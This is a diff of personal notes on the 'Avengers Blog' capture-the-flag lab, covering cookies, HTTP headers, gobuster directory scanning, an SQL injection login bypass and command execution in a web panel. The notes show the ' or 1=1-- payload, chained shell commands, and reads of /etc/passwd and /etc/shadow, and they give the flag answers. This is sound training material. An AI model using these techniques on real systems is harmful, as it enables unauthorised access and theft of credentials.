@@ -14,13 +14,9 @@ Connect to our network and deploy the Avengers Blog machine
 
 This machine may take 5-10 minutes to load fully.
 
-
-
 Connect to our network by going to your access page. This is important as you will not be able to access the machine without connecting!
 
-
 Deploy the machine by clicking the green "Deploy" button on this task and access its webserver.
-
 
 ### Cookies 
 
@@ -31,7 +27,6 @@ HTTP Cookies is a small piece of data sent from a website and stored on the user
 Advertisers can use also tracking cookies to identify which sites you've previously visited or where about's on a web-page you've clicked. Some tracking cookies have become so intrusive, many anti-virus programs classify them as spyware.
 
 You can view & dynamically update your cookies directly in your browser. To do this, press F12 (or right click and select Inspect) to open the developer tools on your browser, then click Application and then Cookies. 
-
 
 ```
 view-source:http://10.10.252.163/js/script.js
@@ -45,8 +40,6 @@ On the deployed Avengers machine you recently deployed, get the flag1 cookie val
 
 or just go to inspect and choose cookies
 
-![[Pasted image 20221003144903.png]]
-
 ### HTTP Headers 
 
 HTTP Headers let a client and server pass information with a HTTP request or response. Header names and values are separated by a single colon and are integral part of the HTTP protocol.
@@ -56,9 +49,6 @@ HTTP Headers let a client and server pass information with a HTTP request or res
 The main two HTTP Methods are POST and GET requests. The GET method us used to request data from a resource and the POST method is used to send data to a server.
 
 We can view requests made to and from our browser by opening the Developer Tools again and navigating to the Network tab. Have this tab open and refresh the page to see all requests made. You will be able to see the original request made from your browser to the web server. 
-
-
-![[Pasted image 20221003145328.png]]
 
 Look at the HTTP response headers and obtain flag 2.
 *headers_are_important*
@@ -164,7 +154,6 @@ You can either download GoBuster, or use the Kali Linux machine that has it pre-
 Lets run GoBuster with a wordlist (on Kali they're located under /usr/share/wordlists):
 gobuster dir -u http://<machine_ip> -w <word_list_location>
 
-
 ```
                                                                           
 ┌──(kali㉿kali)-[~]
@@ -222,7 +211,6 @@ This would authenticate us as the admin user.
       <!-- Remember to sanitize username and password to stop SQLi -->
       <p class="mt-5 mb-3 text-muted">&copy; Avengers 2012 - 2019</p>
 
-
 so as username
 
 ' or 1=1--
@@ -243,10 +231,6 @@ Have the username and password as ' or 1=1-- (include the apostrophe).
 
 ### Remote Code Execution and Linux 
 
-![[Pasted image 20221003151412.png]]
-
-
-
 You should be logged into the Jarvis access panel! Here we can execute commands on the machine.. I wonder if we can exploit this to read files on the system.
 
 Try executing the ls command to list all files in the current directory. Now try joining 2 Linux commands together to list files in the parent directory: cd ../; ls doing so will show a file called flag5.txt, we can add another command to read this file: cd ../; ls; cat flag5.txt
@@ -261,7 +245,6 @@ Command results
 avengers
 flag5.txt
 d335e2d13f36558ba1e67969a1718af7
-
 
 tac /etc/passwd
 
@@ -301,7 +284,6 @@ root:x:0:0:root:/root:/bin/bash
 
 tac /etc/shadow
 Command disallowed
-
 
    <script>
       async function runCommand(commandStr) {
@@ -425,7 +407,6 @@ Command disallowed
       particlesJS("particles-js", particlesJSON)
 </script>
 
-
 ┌──(kali㉿kali)-[~]
 └─$ cat pass.txt | r
 cat pass.txt
@@ -451,11 +432,8 @@ mailcall
 
 ```
 
-![[Pasted image 20221003152128.png]]
-
 Read the contents of flag5.txt
 What Linux command can read a file content in reverse?
 *d335e2d13f36558ba1e67969a1718af7*
-
 
 [[Linux Local Enumeration]]
